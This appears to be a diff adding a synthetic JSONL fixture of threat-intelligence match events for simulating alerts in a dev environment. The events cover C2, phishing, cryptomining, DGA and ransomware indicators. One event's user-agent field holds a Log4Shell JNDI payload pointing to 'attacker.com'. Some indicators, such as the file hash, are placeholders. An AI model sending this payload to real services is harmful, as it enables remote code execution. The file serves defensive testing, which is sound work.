@@ -1,0 +1,31 @@
+# Sample Threat Intelligence Match Events
+# This file contains synthetic threat intel correlation results
+#
+# Format: JSON - one event per line
+# These represent matches between observed network activity and known threat indicators
+#
+# Usage: Can be used with dev environment to simulate threat intelligence alerts
+
+{"timestamp":"2024-11-20T08:10:45.123456+0000","event_type":"intel_match","source":"suricata","indicator_type":"domain","indicator":"known-malware-c2.com","confidence":0.95,"severity":"high","threat_category":"malware","details":{"ip":"192.168.1.200","matched_at":"2024-11-20T08:10:45+0000","intel_source":"abuse.ch","threat_name":"Emotet C2","last_seen":"2024-11-15T00:00:00+0000"},"device":{"ip":"192.168.1.200","mac":"aa:bb:cc:dd:ee:f0","type":"workstation"}}
+
+{"timestamp":"2024-11-20T08:18:47.234567+0000","event_type":"intel_match","source":"dns","indicator_type":"domain","indicator":"suspicious-domain.tk","confidence":0.75,"severity":"medium","threat_category":"suspicious","details":{"ip":"192.168.1.100","matched_at":"2024-11-20T08:18:47+0000","intel_source":"urlhaus","threat_name":"Newly Registered Domain","creation_date":"2024-11-18T00:00:00+0000","registrar":"freenom"},"device":{"ip":"192.168.1.100","mac":"11:22:33:44:55:66","type":"laptop"}}
+
+{"timestamp":"2024-11-20T08:22:05.345678+0000","event_type":"intel_match","source":"suricata","indicator_type":"ip","indicator":"185.220.101.42","confidence":0.88,"severity":"high","threat_category":"tor_exit_node","details":{"matched_at":"2024-11-20T08:22:05+0000","intel_source":"torproject.org","connection_type":"outbound","destination_port":443},"device":{"ip":"192.168.1.150","mac":"22:33:44:55:66:77","type":"workstation"}}
+
+{"timestamp":"2024-11-20T08:28:15.456789+0000","event_type":"intel_match","source":"dns","indicator_type":"domain","indicator":"phishing-site.xyz","confidence":0.92,"severity":"high","threat_category":"phishing","details":{"ip":"192.168.1.200","matched_at":"2024-11-20T08:28:15+0000","intel_source":"phishtank","threat_name":"Bank Phishing Page","target_brand":"Generic Bank","reported_date":"2024-11-19T00:00:00+0000"},"device":{"ip":"192.168.1.200","mac":"aa:bb:cc:dd:ee:f0","type":"workstation"}}
+
+{"timestamp":"2024-11-20T08:33:27.567890+0000","event_type":"intel_match","source":"dns","indicator_type":"domain","indicator":"cdn.malvertising.com","confidence":0.70,"severity":"medium","threat_category":"malvertising","details":{"ip":"192.168.1.75","matched_at":"2024-11-20T08:33:27+0000","intel_source":"custom_feed","threat_name":"Malicious Ad Network","campaign":"FakeUpdate"},"device":{"ip":"192.168.1.75","mac":"33:44:55:66:77:88","type":"iot_device"}}
+
+{"timestamp":"2024-11-20T08:40:31.678901+0000","event_type":"intel_match","source":"dns","indicator_type":"domain","indicator":"cryptojacking-pool.io","confidence":0.85,"severity":"medium","threat_category":"cryptomining","details":{"ip":"192.168.1.88","matched_at":"2024-11-20T08:40:31+0000","intel_source":"coinblocker","threat_name":"Monero Mining Pool","pool_type":"xmr"},"device":{"ip":"192.168.1.88","mac":"44:55:66:77:88:99","type":"unknown"}}
+
+{"timestamp":"2024-11-20T09:05:12.789012+0000","event_type":"intel_match","source":"suricata","indicator_type":"file_hash","indicator":"d41d8cd98f00b204e9800998ecf8427e","confidence":0.98,"severity":"critical","threat_category":"malware","details":{"filename":"malware.exe","matched_at":"2024-11-20T09:05:12+0000","intel_source":"virustotal","threat_name":"Generic Trojan","av_detections":45,"total_av_engines":70,"first_submission":"2024-11-10T00:00:00+0000"},"device":{"ip":"192.168.1.180","mac":"55:66:77:88:99:aa","type":"workstation"}}
+
+{"timestamp":"2024-11-20T09:15:45.890123+0000","event_type":"intel_match","source":"suricata","indicator_type":"ip","indicator":"104.21.75.122","confidence":0.65,"severity":"low","threat_category":"scanner","details":{"matched_at":"2024-11-20T09:15:45+0000","intel_source":"shodan","threat_name":"Port Scanner","scanned_port":22,"scan_type":"ssh"},"device":{"ip":"192.168.1.50","mac":"66:77:88:99:aa:bb","type":"server"}}
+
+{"timestamp":"2024-11-20T09:25:33.901234+0000","event_type":"intel_match","source":"suricata","indicator_type":"ja3_hash","indicator":"771,49195-49199-49196-49200-52393-52392-49171-49172,0-23-65281-10-11,23-24-25,0","confidence":0.80,"severity":"medium","threat_category":"malware_traffic","details":{"matched_at":"2024-11-20T09:25:33+0000","intel_source":"sslbl","threat_name":"TLS Fingerprint - Trickbot","protocol":"TLS 1.2"},"device":{"ip":"192.168.1.75","mac":"33:44:55:66:77:88","type":"iot_device"}}
+
+{"timestamp":"2024-11-20T09:35:18.012345+0000","event_type":"intel_match","source":"dns","indicator_type":"domain","indicator":"dga-generated-domain-12345.com","confidence":0.78,"severity":"medium","threat_category":"dga","details":{"ip":"192.168.1.120","matched_at":"2024-11-20T09:35:18+0000","intel_source":"bambenek","threat_name":"Domain Generation Algorithm","malware_family":"Conficker","entropy_score":4.2},"device":{"ip":"192.168.1.120","mac":"77:88:99:aa:bb:cc","type":"workstation"}}
+
+{"timestamp":"2024-11-20T09:45:52.123456+0000","event_type":"intel_match","source":"suricata","indicator_type":"user_agent","indicator":"${jndi:ldap://attacker.com/a}","confidence":0.99,"severity":"critical","threat_category":"exploit","details":{"matched_at":"2024-11-20T09:45:52+0000","intel_source":"cve_database","threat_name":"Log4Shell Exploit Attempt","cve":"CVE-2021-44228","targeted_service":"java_app"},"device":{"ip":"10.0.0.5","mac":"88:99:aa:bb:cc:dd","type":"server"}}
+
+{"timestamp":"2024-11-20T10:00:30.234567+0000","event_type":"intel_match","source":"dns","indicator_type":"domain","indicator":"ransomware-payment-portal.onion.to","confidence":0.91,"severity":"critical","threat_category":"ransomware","details":{"ip":"192.168.1.200","matched_at":"2024-11-20T10:00:30+0000","intel_source":"ransomware_tracker","threat_name":"Ransomware Payment Site","ransomware_family":"LockBit","onion_gateway":"tor2web"},"device":{"ip":"192.168.1.200","mac":"aa:bb:cc:dd:ee:f0","type":"workstation"}}
